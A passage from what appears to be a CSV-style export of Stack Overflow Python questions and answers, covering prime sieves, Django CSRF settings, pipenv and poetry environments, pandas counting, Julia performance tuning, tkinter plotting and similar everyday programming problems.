    # and odd(m) and coprime(x, m) and m**2 + x**2 &lt;= 2*N))
    # in this version, m is generated from primes, and the values
    # are iterated through unordered.
    mmax = isqrt(2*N - 1)
    p_list = list(primes(mmax))[1:]  # skip 2
    for m, p_distinct in gen_prod_primes(p_list, upto=mmax):
        if m &lt; 3:
            continue
        # requirement: (m**2 + x**2) // 2 &lt;= N
        # note, both m and x are odd (so (m**2 + x**2) // 2 == (m**2 + x**2) / 2)
        xmax = isqrt(2*N - m*m)
        cnt_m = phi(m+1, upto=xmax, p_list=(2,) + tuple(p_distinct))
        if cnt_m &gt; 0:
            yield m, cnt_m

def pt_count(N, progress=False):
    mmax = isqrt(2*N - 1)
    it = pt_count_m(N)
    if progress:
        it = tqdm(it, total=(mmax - 3 + 1) // 2)
    return sum(cnt_m for m, cnt_m in it)
</code></pre>
<p>And now:</p>
<pre class=""lang-py prettyprint-override""><code>%timeit pt_count(100_000_000)
31.1 ms ± 38.9 µs per loop (mean ± std. dev. of 7 runs, 10 loops each)

%timeit pt_count(1_000_000_000)
104 ms ± 299 µs per loop (mean ± std. dev. of 7 runs, 10 loops each)

# the speedup is still very moderate at that stage

# however:
%%time
big_n = 3_141_592_653_589_793
N = big_n
res = pt_count(N)

CPU times: user 4min 5s, sys: 662 ms, total: 4min 6s
Wall time: 4min 6s

&gt;&gt;&gt; res
500000000002845
</code></pre>
<p><strong>Addendum: Atkin's sieve</strong></p>
<p>As promised, here is my version of Atkin's sieve. It can definitely be sped up.</p>
<pre class=""lang-py prettyprint-override""><code>def primes(limit):
    # Generates prime numbers between 2 and n
    # Atkin's sieve -- see http://en.wikipedia.org/wiki/Prime_number
    sqrtLimit = isqrt(limit) + 1

    # initialize the sieve
    is_prime = [False, False, True, True, False] + [False for _ in range(5, limit + 1)]

    # put in candidate primes:
    # integers which have an odd number of
    # representations by certain quadratic forms
    for x in range(1, sqrtLimit):
        x2 = x * x
        for y in range(1, sqrtLimit):
            y2 = y*y
            n = 4 * x2 + y2
            if n &lt;= limit and (n % 12 == 1 or n % 12 == 5): is_prime[n] ^= True
            n = 3 * x2 + y2
            if n &lt;= limit and (n % 12 == 7): is_prime[n] ^= True
            n = 3*x2-y2
            if n &lt;= limit and x &gt; y and n % 12 == 11: is_prime[n] ^= True

    # eliminate composites by sieving
    for n in range(5, sqrtLimit):
        if is_prime[n]:
            sqN = n**2
            # n is prime, omit multiples of its square; this is sufficient because
            # composites which managed to get on the list cannot be square-free
            for i in range(1, int(limit/sqN) + 1):
                k = i * sqN # k ∈ {n², 2n², 3n², ..., limit}
                is_prime[k] = False
    for i, truth in enumerate(is_prime):
        if truth: yield i
</code></pre>
"
"70639443","1","Convert a bytes iterable to an iterable of str, where each value is a line","<p>I have an iterable of <code>bytes</code>, such as</p>
<pre><code>bytes_iter = (
    b'col_1,',
    b'c',
    b'ol_2\n1',
    b',&quot;val',
    b'ue&quot;\n',
)
</code></pre>
<p>(but typically this would <em>not</em> be hard coded or available all at once, but supplied from a generator say) and I want to convert this to an iterable of <code>str</code> lines, where line breaks are unknown up front, but could be any of <code>\r</code>, <code>\n</code> or <code>\r\n</code>. So in this case would be:</p>
<pre class=""lang-py prettyprint-override""><code>lines_iter = (
    'col_1,col_2',
    '1,&quot;value&quot;',
)
</code></pre>
<p>(but again, just as an iterable, not so it's all in memory at once).</p>
<p>How can I do this?</p>
<p>Context: my aim is to then pass the iterable of str lines to <code>csv.reader</code> (that I <em>think</em> needs whole lines?), but I'm interested in this answer just in general.</p>
","70639580","<p>Use the <code>io</code> module to do most of the work for you:</p>
<pre><code>class ReadableIterator(io.IOBase):
    def __init__(self, it):
        self.it = iter(it)
    def read(self, n):
        # ignore argument, nobody actually cares
        # note that it is *critical* that we suppress the `StopIteration` here
        return next(self.it, b'')
    def readable(self):
        return True
</code></pre>
<p>then just call <code>io.TextIOWrapper(ReadableIterator(some_iterable_of_bytes))</code>.</p>
"
"71086270","1","No module named 'virtualenv.activation.xonsh'","<p>I triyed to execute pipenv shell in a new environtment and I got the following error:</p>
<pre><code>Loading .env environment variables…
Creating a virtualenv for this project…
Using /home/user/.pyenv/shims/python3.9 (3.9.7) to create virtualenv…
⠋ModuleNotFoundError: No module named 'virtualenv.activation.xonsh'
Error while trying to remove the /home/user/.local/share/virtualenvs/7t env: 
No such file or directory

Virtualenv location: 
Warning: Your Pipfile requires python_version 3.9, but you are using None (/bin/python).
  $ pipenv check will surely fail.
Spawning environment shell (/usr/bin/zsh). Use 'exit' to leave.
</code></pre>
<p>I tried to remove pipenv, install python with pienv create an alias to python, but anything works.</p>
<p>Any idea, I got the same error in existing environment, I tried to remove all environments folder but nothing.</p>
<p>Thanks.</p>
","71092453","<p>By github issue, the solution that works was the following:</p>
<pre><code>sudo apt-get remove python3-virtualenv
</code></pre>
"
"70588185","1","WARNING: The script pip3.8 is installed in '/usr/local/bin' which is not on PATH","<p>When running <code>pip3.8</code> i get the following warning appearing in my terminal</p>
<pre class=""lang-bash prettyprint-override""><code>WARNING: The script pip3.8 is installed in '/usr/local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
Successfully installed pip-21.1.1 setuptools-56.0.0
WARNING: Running pip as root will break packages and permissions. You should install packages reliably by using venv: https://pip.pypa.io/warnings/venv
</code></pre>
<p>How to solve this problem on centos 7?</p>
","70680333","<p>This question has been answered on the serverfaults forum: Here is a <a href=""https://serverfault.com/questions/102932/adding-a-directory-to-path-in-centos"">link to the question</a>.</p>
<p>You need to add the following line to your <code>~/.bash_profile</code> or <code>~/.bashrc</code> file.</p>
<pre class=""lang-sh prettyprint-override""><code> export PATH=&quot;/usr/local/bin:$PATH&quot;
</code></pre>
<p>You will then need to profile, do this by either running the command:</p>
<pre class=""lang-sh prettyprint-override""><code>source ~/.bash_profile
</code></pre>
<p>Or by simply closing your terminal and opening a new session. You should continue to check your <code>PATH</code> to make sure it includes the path.</p>
<pre class=""lang-sh prettyprint-override""><code>echo $PATH
</code></pre>
"
"70679571","1","How do I set a wildcard for CSRF_TRUSTED_ORIGINS in Django?","<p>After updating from Django 2 to Django 4.0.1 I am getting CSRF errors on all POST requests. The logs show:</p>
<p>&quot;WARNING:django.security.csrf:Forbidden (Origin checking failed - <a href=""https://127.0.0.1"" rel=""noreferrer"">https://127.0.0.1</a> does not match any trusted origins.): /activate/&quot;</p>
<p>I can't figure out how to set a wildcard for CSRF_TRUSTED_ORIGINS? I have a server shipped to customers who host it on their own domain so there is no way for me to no the origin before hand. I have tried the following with no luck:</p>
<pre><code>CSRF_TRUSTED_ORIGINS = [&quot;https://*&quot;, &quot;http://*&quot;]
</code></pre>
<p>and</p>
<pre><code>CSRF_TRUSTED_ORIGINS = [&quot;*&quot;]
</code></pre>
<p>Explicitly setting &quot;https://127.0.0.1&quot; in the CSRF_TRUSTED_ORIGINS works but won't work in my customer's production deployment which will get another hostname.</p>
","70689561","<p>The Django app is running using Gunicorn behind NGINX. Because SSL is terminated after NGINX request.is_secure() returns false which results in Origin header not matching the host here:</p>
<p><a href=""https://github.com/django/django/blob/3ff7f6cf07a722635d690785c31ac89484134bee/django/middleware/csrf.py#L276"" rel=""nofollow noreferrer"">https://github.com/django/django/blob/3ff7f6cf07a722635d690785c31ac89484134bee/django/middleware/csrf.py#L276</a></p>
<p>I resolved the issue by adding the following in Django:</p>
<pre><code>SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
</code></pre>
<p>And ensured that NGINX is forwarding the http scheme with the following in my NGINX conf:</p>
<pre><code>proxy_set_header X-Forwarded-Proto $scheme;
</code></pre>
"
"71184699","1","Filter a dictionary of lists","<p>I have a dictionary of the form:</p>
<pre><code>{&quot;level&quot;: [1, 2, 3],
 &quot;conf&quot;: [-1, 1, 2],
 &quot;text&quot;: [&quot;here&quot;, &quot;hel&quot;, &quot;llo&quot;]}
</code></pre>
<p>I want to filter the lists to remove every item at index <code>i</code> where an index in the value <code>&quot;conf&quot;</code> is not &gt;0.</p>
<p>So for the above <code>dict</code>, the output should be this:</p>
<pre><code>{&quot;level&quot;: [2, 3],
 &quot;conf&quot;: [1, 2],
 &quot;text&quot;: [&quot;hel&quot;, &quot;llo&quot;]}
</code></pre>
<p>As the first value of <code>conf</code> was not &gt; 0.</p>
<p>I have tried something like this:</p>
<pre><code>new_dict = {i: [a for a in j if a &gt;= min_conf] for i, j in my_dict.items()}
</code></pre>
<p>But that would work just for one key.</p>
","71184858","<p>I solved it with this:</p>
<pre><code>from typing import Dict, List, Any, Set

d = {&quot;level&quot;:[1,2,3], &quot;conf&quot;:[-1,1,2], &quot;text&quot;:[&quot;-1&quot;, &quot;hel&quot;, &quot;llo&quot;]}

# First, we create a set that stores the indices which should be kept.
# I chose a set instead of a list because it has a O(1) lookup time.
# We only want to keep the items on indices where the value in d[&quot;conf&quot;] is greater than 0
filtered_indexes = {i for i, value in enumerate(d.get('conf', [])) if value &gt; 0}

def filter_dictionary(d: Dict[str, List[Any]], filtered_indexes: Set[int]) -&gt; Dict[str, List[Any]]:
    filtered_dictionary = d.copy()  # We'll return a modified copy of the original dictionary
    for key, list_values in d.items():
        # In the next line the actual filtering for each key/value pair takes place. 
        # The original lists get overwritten with the filtered lists.
        filtered_dictionary[key] = [value for i, value in enumerate(list_values) if i in filtered_indexes]
    return filtered_dictionary

print(filter_dictionary(d, filtered_indexes))
</code></pre>
<p>Output:</p>
<pre><code>{'level': [2, 3], 'conf': [1, 2], 'text': ['hel', 'llo']}
</code></pre>
"
"70698738","1","Two Walrus Operators in one If Statement","<p>Is there a correct way to have two walrus operators in 1 if statement?</p>
<pre><code>if (three:= i%3==0) and (five:= i%5 ==0):
    arr.append(&quot;FizzBuzz&quot;)
elif three:
    arr.append(&quot;Fizz&quot;)
elif five:
    arr.append(&quot;Buzz&quot;)
else:
    arr.append(str(i-1))
</code></pre>
<p>This example works for <code>three</code> but <code>five</code> will be &quot;not defined&quot;.</p>
","70699069","<p>The <a href=""https://docs.python.org/3/reference/expressions.html#boolean-operations"" rel=""nofollow noreferrer"">logical operator <code>and</code></a> evaluates its second operand only conditionally. There is no correct way to have a <em>conditional</em> assignment that is <em>unconditionally</em> needed.</p>
<p>Instead use the <a href=""https://docs.python.org/3/reference/expressions.html#binary-bitwise-operations"" rel=""nofollow noreferrer"">&quot;binary&quot; operator <code>&amp;</code></a>, which evaluates its second operand unconditionally.</p>
<pre class=""lang-py prettyprint-override""><code>arr = []
for i in range(1, 25):
    #                        v force evaluation of both operands
    if (three := i % 3 == 0) &amp; (five := i % 5 == 0):
        arr.append(&quot;FizzBuzz&quot;)
    elif three:
        arr.append(&quot;Fizz&quot;)
    elif five:
        arr.append(&quot;Buzz&quot;)
    else:
        arr.append(str(i))

print(arr)
# ['1', '2', 'Fizz', '4', 'Buzz', 'Fizz', '7', '8', 'Fizz', 'Buzz', '11', ...]
</code></pre>
<p>Correspondingly, one can use <code>|</code> as an unconditional variant of <code>or</code>. In addition, the &quot;xor&quot; operator <code>^</code> has no equivalent with conditional evaluation at all.</p>
<p>Notably, the binary operators evaluate booleans as purely boolean  - for example, <code>False | True</code> is <code>True</code> not <code>1</code> – but may work differently for other types. To evaluate arbitrary values such as <code>list</code>s in a boolean context with binary operators, convert them to <code>bool</code> after assignment:</p>
<pre class=""lang-py prettyprint-override""><code>#  |~~~ force list to boolean ~~| | force evaluation of both operands
#  v    v~ walrus-assign list ~vv v
if bool(lines := list(some_file)) &amp; ((today := datetime.today()) == 0):
   ...
</code></pre>
<p>Since assignment expressions require parentheses for proper precedence, the common problem of <a href=""https://docs.python.org/3/reference/expressions.html#operator-precedence"" rel=""nofollow noreferrer"">different precedence</a> between logical (<code>and</code>, <code>or</code>) and binary (<code>&amp;</code>, <code>|</code>, <code>^</code>) operators is irrelevant here.</p>
"
"70721360","1","Python/Selenium web scrap how to find hidden src value from a links?","<p>Scrapping links should be a simple feat, usually just grabbing the <code>src</code> value of the a tag.</p>
<p>I recently came across this website (<a href=""https://sunteccity.com.sg/promotions"" rel=""nofollow noreferrer"">https://sunteccity.com.sg/promotions</a>) where the href value of a tags of each item cannot be found, but the redirection still works. I'm trying to figure out a way to grab the items and their corresponding links. My typical python selenium code looks something as such</p>
<pre><code>all_items = bot.find_elements_by_class_name('thumb-img')
for promo in all_items:
    a = promo.find_elements_by_tag_name(&quot;a&quot;)
    print(&quot;a[0]: &quot;, a[0].get_attribute(&quot;href&quot;))
</code></pre>
<p>However, I can't seem to retrieve any <code>href</code>, <code>onclick</code> attributes, and I'm wondering if this is even possible. I noticed that I couldn't do a right-click, open link in new tab as well.</p>
<p>Are there any ways around getting the links of all these items?</p>
<p>Edit: Are there any ways to retrieve all the links of the items on the pages?</p>
<p>i.e.</p>
<pre><code>https://sunteccity.com.sg/promotions/724
https://sunteccity.com.sg/promotions/731
https://sunteccity.com.sg/promotions/751
https://sunteccity.com.sg/promotions/752
https://sunteccity.com.sg/promotions/754
https://sunteccity.com.sg/promotions/280
...
</code></pre>
<hr />
<p>Edit:
Adding an image of one such anchor tag for better clarity:
<a href=""https://i.stack.imgur.com/xbUke.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xbUke.png"" alt=""enter image description here"" /></a></p>
","70725182","<p>By reverse-engineering the Javascript that takes you to the promotions pages (seen in <a href=""https://sunteccity.com.sg/_nuxt/d4b648f.js"" rel=""nofollow noreferrer"">https://sunteccity.com.sg/_nuxt/d4b648f.js</a>) that gives you a way to get all the links, which are based on the <code>HappeningID</code>. You can verify by running this in the JS console, which gives you the first promotion:</p>
<pre class=""lang-js prettyprint-override""><code>window.__NUXT__.state.Promotion.promotions[0].HappeningID
</code></pre>
<p>Based on that, you can create a Python loop to get all the promotions:</p>
<pre class=""lang-py prettyprint-override""><code>items = driver.execute_script(&quot;return window.__NUXT__.state.Promotion;&quot;)
for item in items[&quot;promotions&quot;]:
    base = &quot;https://sunteccity.com.sg/promotions/&quot;
    happening_id = str(item[&quot;HappeningID&quot;])
    print(base + happening_id)
</code></pre>
<p>That generated the following output:</p>
<pre><code>https://sunteccity.com.sg/promotions/724
https://sunteccity.com.sg/promotions/731
https://sunteccity.com.sg/promotions/751
https://sunteccity.com.sg/promotions/752
https://sunteccity.com.sg/promotions/754
https://sunteccity.com.sg/promotions/280
https://sunteccity.com.sg/promotions/764
https://sunteccity.com.sg/promotions/766
https://sunteccity.com.sg/promotions/762
https://sunteccity.com.sg/promotions/767
https://sunteccity.com.sg/promotions/732
https://sunteccity.com.sg/promotions/733
https://sunteccity.com.sg/promotions/735
https://sunteccity.com.sg/promotions/736
https://sunteccity.com.sg/promotions/737
https://sunteccity.com.sg/promotions/738
https://sunteccity.com.sg/promotions/739
https://sunteccity.com.sg/promotions/740
https://sunteccity.com.sg/promotions/741
https://sunteccity.com.sg/promotions/742
https://sunteccity.com.sg/promotions/743
https://sunteccity.com.sg/promotions/744
https://sunteccity.com.sg/promotions/745
https://sunteccity.com.sg/promotions/746
https://sunteccity.com.sg/promotions/747
https://sunteccity.com.sg/promotions/748
https://sunteccity.com.sg/promotions/749
https://sunteccity.com.sg/promotions/750
https://sunteccity.com.sg/promotions/753
https://sunteccity.com.sg/promotions/755
https://sunteccity.com.sg/promotions/756
https://sunteccity.com.sg/promotions/757
https://sunteccity.com.sg/promotions/758
https://sunteccity.com.sg/promotions/759
https://sunteccity.com.sg/promotions/760
https://sunteccity.com.sg/promotions/761
https://sunteccity.com.sg/promotions/763
https://sunteccity.com.sg/promotions/765
https://sunteccity.com.sg/promotions/730
https://sunteccity.com.sg/promotions/734
https://sunteccity.com.sg/promotions/623
</code></pre>
"
"70585068","1","How do I get libpq to be found by ctypes find_library?","<p>I am building a simple DB interface in Python (3.9.9) and I am using psycopg (3.0.7) to connect to my Postgres (14.1) database. Until recently, the development of this app took place on Linux, but now I am using macOS Monterey on an M1 Mac mini. This seems to be causing some troubles with ctypes, which psycopg uses extensively. The error I am getting is the following:</p>
<pre><code>ImportError: no pq wrapper available.
Attempts made:
- couldn't import psycopg 'c' implementation: No module named 'psycopg_c'
- couldn't import psycopg 'binary' implementation: No module named 'psycopg_binary'
- couldn't import psycopg 'python' implementation: libpq library not found
</code></pre>
<p>Based on the <a href=""https://github.com/psycopg/psycopg/blob/956238bef739675d46d6e65c953c1dcef10a165e/psycopg3/psycopg3/pq/_pq_ctypes.py#L16-L21"" rel=""noreferrer"">source code of psycopg</a>, this is an error of ctypes not being able to util.find_library libpq.dylib. Postgres is installed as Postgres.app, meaning that libpq.dylib's path is</p>
<p>/Applications/Postgres.app/Contents/Versions/14/bin/lib</p>
<p>I have tried adding this to PATH, but it did not work. I then created a symlink to the path in /usr/local/lib, but (unsurprisingly) it also did not work. I then did some digging and found <a href=""https://bugs.python.org/issue44689"" rel=""noreferrer"">this issue</a> describing the same problem. I am not a big macOS expert, so I am unsure on how to interpret some of the points raised. Do I need to add the path to the shared cache? Also, I do not want to fork the Python repo and implement the dlopen() method as suggested, as it seems to lead to other problems.</p>
<p>Anyhow, is there a solution to quickly bypass this problem? As an additional reference, the code producing the above error is just:</p>
<pre><code>import psycopg

print(psycopg.__version__)
</code></pre>
","70740545","<p>I had this problem but the solution was suggested to me by <a href=""https://stackoverflow.com/a/19516579"">this answer to a related question</a>: try setting envar <code>DYLD_LIBRARY_PATH</code> to the path you identified.</p>
<p>NB, to get it working myself, I:</p>
<ul>
<li>used the path <code>/Applications/Postgres.app/Contents/Versions/latest/lib</code> and</li>
<li>had to install Python 3.9</li>
</ul>
"
"70729502","1","F2 rename variable doesn't work in vscode + jupyter notebook + python","<p>I can use the normal F2 rename variable functionality in regular python files in vscode. But not when editing python in a jupyter notebook.</p>
<p>When I press F2 on a variable in a jupyter notebook in vscode I get the familiar change variable window but when I press enter the variable is not changed and I get this error message:</p>
<blockquote>
<p>No result. No result.</p>
</blockquote>
<p>Is there a way to get the F2 change variable functionality to work in jupyter notebooks?</p>
<p>Here's my system info:</p>
<p>jupyter module version</p>
<pre><code>(adventofcode) C:\git\leetcode&gt;pip show jupyter
Name: jupyter
Version: 1.0.0
Summary: Jupyter metapackage. Install all the Jupyter components in one go.
Home-page: http://jupyter.org
Author: Jupyter Development Team
Author-email: jupyter@googlegroups.org
License: BSD
Location: c:\users\johan\anaconda3\envs\adventofcode\lib\site-packages
Requires: ipykernel, qtconsole, nbconvert, jupyter-console, notebook, ipywidgets
Required-by:
</code></pre>
<p>Python version:</p>
<pre><code>(adventofcode) C:\git\leetcode&gt;python --version
Python 3.10.0
</code></pre>
<p>vscode version:</p>
<pre><code>1.63.2 (user setup)
</code></pre>
<p>vscode Jupyter extension version (from the changelog in the extensions window):</p>
<pre><code>2021.11.100 (November Release on 8 December 2021)
</code></pre>
","70736000","<p>Notice that you put up a bug report in GitHub and see this issue: <a href=""https://github.com/microsoft/vscode-jupyter/issues/7433"" rel=""noreferrer"">Renaming variables didn't work</a>, the programmer replied:</p>
<blockquote>
<p>Some language features are currently not supported in notebooks, but
we are making plans now to hopefully bring more of those online soon.</p>
</blockquote>
<p>So please wait for this feature.</p>
"
"70766215","1","Problem with memory allocation in Julia code","<p>I used a function in Python/Numpy to solve a problem in <a href=""https://oeis.org/A215721"" rel=""noreferrer"">combinatorial game theory</a>.</p>
<pre><code>import numpy as np
from time import time

def problem(c):
    start = time()
    N = np.array([0, 0])
    U = np.arange(c)
    
    for _ in U:
        bits = np.bitwise_xor(N[:-1], N[-2::-1])
        N = np.append(N, np.setdiff1d(U, bits).min())

    return len(*np.where(N==0)), time()-start 

problem(10000)
</code></pre>
<p>Then I wrote it in Julia because I thought it'd be faster due to Julia using just-in-time compilation.</p>
<pre><code>function problem(c)
    N = [0]
    U = Vector(0:c)
    
    for _ in U
        elems = N[1:length(N)-1]
        bits = elems .⊻ reverse(elems)
        push!(N, minimum(setdiff(U, bits))) 
    end
    
    return sum(N .== 0)
end

@time problem(10000)
</code></pre>
<p>But the second version was much slower. For c = 10000, the Python version takes 2.5 sec. on an Core i5 processor and the Julia version takes 4.5 sec. Since Numpy operations are implemented in C, I'm wondering if Python is indeed faster or if I'm writing a function with wasted time complexity.</p>
<p>The implementation in Julia allocates a lot of memory. How to reduce the number of allocations to improve its performance?</p>
","70766903","<p>The original code can be re-written in the following way:</p>
<pre><code>function problem2(c)
    N = zeros(Int, c+2)
    notseen = falses(c+1)

    for lN in 1:c+1
        notseen .= true
        @inbounds for i in 1:lN-1
            b = N[i] ⊻ N[lN-i]
            b &lt;= c &amp;&amp; (notseen[b+1] = false)
        end
        idx = findfirst(notseen)
        isnothing(idx) || (N[lN+1] = idx-1)
    end
    return count(==(0), N)
end
</code></pre>
<p>First check if the functions produce the same results:</p>
<pre><code>julia&gt; problem(10000), problem2(10000)
(1475, 1475)
</code></pre>
<p>(I have also checked that the generated <code>N</code> vector is identical)</p>
<p>Now let us benchmark both functions:</p>
<pre><code>julia&gt; using BenchmarkTools

julia&gt; @btime problem(10000)
  4.938 s (163884 allocations: 3.25 GiB)
1475

julia&gt; @btime problem2(10000)
  76.275 ms (4 allocations: 79.59 KiB)
1475
</code></pre>
<p>So it turns out to be over 60x faster.</p>
<p>What I do to improve the performance is avoiding allocations. In Julia it is easy and efficient. If any part of the code is not clear please comment. Note that I concentrated on showing how to improve the performance of Julia code (and not trying to just replicate the Python code, since - as it was commented under the original post - doing language performance comparisons is very tricky). I think it is better to concentrate in this discussion on how to make Julia code fast.</p>
<hr />
<h1>EDIT</h1>
<p>Indeed changing to <code>Vector{Bool}</code> and removing the condition on <code>b</code> and <code>c</code> relation (which mathematically holds for these values of <code>c</code>) gives a better speed:</p>
<pre><code>julia&gt; function problem3(c)
           N = zeros(Int, c+2)
           notseen = Vector{Bool}(undef, c+1)

           for lN in 1:c+1
               notseen .= true
               @inbounds for i in 1:lN-1
                   b = N[i] ⊻ N[lN-i]
                   notseen[b+1] = false
               end
               idx = findfirst(notseen)
               isnothing(idx) || (N[lN+1] = idx-1)
           end
           return count(==(0), N)
       end
problem3 (generic function with 1 method)

julia&gt; @btime problem3(10000)
  20.714 ms (3 allocations: 88.17 KiB)
1475
</code></pre>
"
"70739858","1","How to create a brand new virtual environment or duplicate an existing one in poetry? (Multiple environment in a project)","<p>I have a project and an existing virtual environment created with poetry (<strong>poetry install/init</strong>).
So, as far as I know, the purpouse of a virtual environment is avoiding to modify the system base environment and the possibility of isolation (per project, per development, per system etc...).</p>
<p><strong>How can I create another brand new environment for my project in poetry? How can I eventually duplicate and use an existing one?</strong></p>
<p>I mean that <strong>the current one (activated) should be not involved in this</strong> (except for eventually copying it) because I want to test another set of dependencies and code.</p>
<p>I am aware of this:</p>
<ul>
<li><a href=""https://github.com/python-poetry/poetry/issues/4055"" rel=""noreferrer"">https://github.com/python-poetry/poetry/issues/4055</a> (answer is not clear and ticket is not closed)</li>
<li><a href=""https://python-poetry.org/docs/managing-environments/"" rel=""noreferrer"">https://python-poetry.org/docs/managing-environments/</a> (use command seems not to work in the requested way)</li>
</ul>
","70767511","<p>Poetry seems to be <strong>bound to one virtualenv per python interpreter</strong>.
Poetry <strong>is also bound to the pyproject.toml file and its path</strong> to generate a new environment.</p>
<p>So there are 2 tricky solutions:</p>
<p>1 - change your deps in the pyproject.toml and <strong>use another python version</strong> (installed for example with pyenv) and then:</p>
<pre><code>poetry env use X.Y
</code></pre>
<p>poetry will create a new virtual environment but this is not exactly the same as changing just some project deps.</p>
<p>2 - <strong>use another pyproject.toml from another path</strong>:</p>
<pre><code>mkdir env_test
cp pyproject.toml env_test/pyproject.toml
cd env_test
nano pyproject.toml # edit your dependencies
poetry install # creates a brand new virtual environment
poetry shell
# run your script with the new environment
</code></pre>
<p>This will generate a new environment with just the asked dependencies changed. Both environments can be used at the same time.
After the test, it is eventually possible to delete the new environment with the env command.</p>
"
"70704285","1","Can no longer fold python dictionaries in VS Code","<p>I used to be able to collapse (fold) python dictionaries just fine in my VS Code.  Randomly I am not able to do that anymore.  I can still fold classes and functions just fine, but dictionaries cannot fold, the arrow on the left hand side just isn't there.  I've checked my settings but I can't figure out what would've changed.  I'm not sure the best forum to go to for help, so I'm hoping this is ok.  Any ideas?</p>
","70714478","<p>It's caused by Pylance v2022.1.1. Use v2022.1.0 instead.</p>
<p>Issue <a href=""https://github.com/microsoft/pylance-release/issues/2248"" rel=""nofollow noreferrer"">#2248</a></p>
"
"71198478","1","Counting all combinations of values in multiple columns","<p>The following is an example of items rated by 1,2 or 3 stars.
I am trying to count all combinations of item ratings (stars) per month.</p>
<p>In the following example, item 10 was rated in month 1 and has two ratings equal 1, one rating equal 2 and one rating equal 3.</p>
<pre><code>inp = pd.DataFrame({'month':[1,1,1,1,1,2,2,2], 
                    'item':[10,10,10,10,20,20,20,20], 
                    'star':[1,2,1,3,3,2,2,3]}
                  )

 month item star
0   1   10  1
1   1   10  2
2   1   10  1
3   1   10  3
4   1   20  3
5   2   20  2
6   2   20  2
7   2   20  3
</code></pre>
<p>For the given above input frame output should be:</p>
<pre><code>   month    item    star_1_cnt  star_2_cnt  star_3_cnt
0   1       10      2           1           1
1   1       20      0           0           1
2   2       20      0           2           1
</code></pre>
<p>I am trying to solve the problem starting with the following code,
which result still needs to be converted to the desired format of the output frame and which gives the wrong answers:</p>
<pre><code>1   20  3   (1, 1)
2   20  3   (1, 1)
</code></pre>
<p>Anyway, there should be a better way to create the output table, then finalizing this one:</p>
<pre><code>months = [1,2]
items = [10,20]
stars = [1,2,3]

d = {'month': [], 'item': [], 'star': [], 'star_cnts': [] }

for month in months:
    for star in stars:
        for item in items:
            star_cnts=dict(inp[(inp['item']==item) &amp; (inp['star']==star)].value_counts()).values()
            d['month'].append(month)
            d['item'].append(item)
            d['star'].append(star)
            d['star_cnts'].append(star_cnts)
            
pd.DataFrame(d)

    month   item    star    star_cnts
0   1       10      1       (2)
1   1       20      1       ()
2   1       10      2       (1)
3   1       20      2       (2)
4   1       10      3       (1)
5   1       20      3       (1, 1)
6   2       10      1       (2)
7   2       20      1       ()
8   2       10      2       (1)
9   2       20      2       (2)
10  2       10      3       (1)
11  2       20      3       (1, 1)
</code></pre>
<p>​</p>
","71209097","<p>This seems like a nice problem for <a href=""https://pandas.pydata.org/docs/reference/api/pandas.get_dummies.html"" rel=""nofollow noreferrer""><code>pd.get_dummies</code></a>:</p>
<pre><code>new_df = (
    pd.concat([df, pd.get_dummies(df['star'])], axis=1)
    .groupby(['month', 'item'], as_index=False)
    [df['star'].unique()]
    .sum()
)
</code></pre>
<p>Output:</p>
<pre><code>&gt;&gt;&gt; new_df
   month  item  1  2  3
0      1    10  2  1  1
1      1    20  0  0  1
2      2    20  0  2  1
</code></pre>
<p>Renaming, too:</p>
<pre><code>u = df['star'].unique()
new_df = (
    pd.concat([df, pd.get_dummies(df['star'])], axis=1)
    .groupby(['month', 'item'], as_index=False)
    [u]
    .sum()
    .rename({k: f'star_{k}_cnt' for k in df['star'].unique()}, axis=1)
)
</code></pre>
<p>Output:</p>
<pre><code>&gt;&gt;&gt; new_df
   month  item  star_1_cnt  star_2_cnt  star_3_cnt
0      1    10           2           1           1
1      1    20           0           0           1
2      2    20           0           2           1
</code></pre>
<p>Obligatory one- (or two-) liners:</p>
<pre><code># Renames the columns
u = df['star'].unique()
new_df = pd.concat([df, pd.get_dummies(df['star'])], axis=1).groupby(['month', 'item'], as_index=False)[u].sum().rename({k: f'star_{k}_cnt' for k in df['star'].unique()}, axis=1)
</code></pre>
"
"70598913","1","Problem resizing plot on tkinter figure canvas","<p>Python 3.9 on Mac running OS 11.6.1. My application involves placing a plot on a frame inside my root window, and I'm struggling to get the plot to take up a larger portion of the window. I thought <code>rcParams</code> in <code>matplotlib.pyplot</code> would take care of this, but I must be overlooking something.</p>
<p>Here's what I have so far:</p>
<pre><code>import numpy as np
from tkinter import Tk,Frame,TOP,BOTH

import matplotlib
from matplotlib import pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

plt.rcParams[&quot;figure.figsize&quot;] = [18,10]

root=Tk()
root.wm_title(&quot;Root Window&quot;)
root.geometry('1500x1000')

x = np.linspace(0, 2 * np.pi, 400)
y = np.sin(x ** 2)
fig, ax = plt.subplots()
ax.plot(x, y)

canvas_frame=Frame(root) # also tried adjusting size of frame but that didn't help
canvas_frame.pack(side=TOP,expand=True)
canvas = FigureCanvasTkAgg(fig, master=canvas_frame)
canvas.draw()
canvas.get_tk_widget().pack(side=TOP,fill=BOTH,expand=True)


root.mainloop()
</code></pre>
<p>For my actual application, I need for <code>canvas</code> to have a frame as its parent and not simply <code>root</code>, which is why <code>canvas_frame</code> is introduced above.</p>
","70717588","<p>try something like this:</p>
<pre><code>fig.subplots_adjust(left=0.05, bottom=0.07, right=0.95, top=0.95, wspace=0, hspace=0)
</code></pre>
<p>this is output, figure now takes more screen area %
[<img src=""https://i.stack.imgur.com/QELR9.png"" alt=""figure now takes more screen realestate1"" /></p>
"
"71225952","1","Try each function of a class with functools.wraps decorator","<p>I'm trying to define a <strong>decorator</strong> in order to execute a class method, <strong>try it first</strong> and, if an error is detected, raise it mentioning the method in which failed, so as to the user could see in which method is the error.</p>
<p>Here I show a <strong>MRE</strong> (Minimal, Reproducible Example) of my code.</p>
<pre><code>from functools import wraps

def trier(func):
    &quot;&quot;&quot;Decorator for trying A-class methods&quot;&quot;&quot;
    @wraps(func)
    def inner_func(self, name, *args):
        
        try:
            func(self, *args)
        
        except:
            print(f&quot;An error apeared while {name}&quot;)
    
    return inner_func
    
class A:
    def __init__(self):
        self._animals = 2
        self._humans = 5
    
    @trier('getting animals')
    def animals(self, num):
        return self._animals + num
    
    @trier('getting humans')
    def humans(self):
        return self._humans

A().animals
</code></pre>
<p>Many <strong>errors</strong> are raising, like:</p>
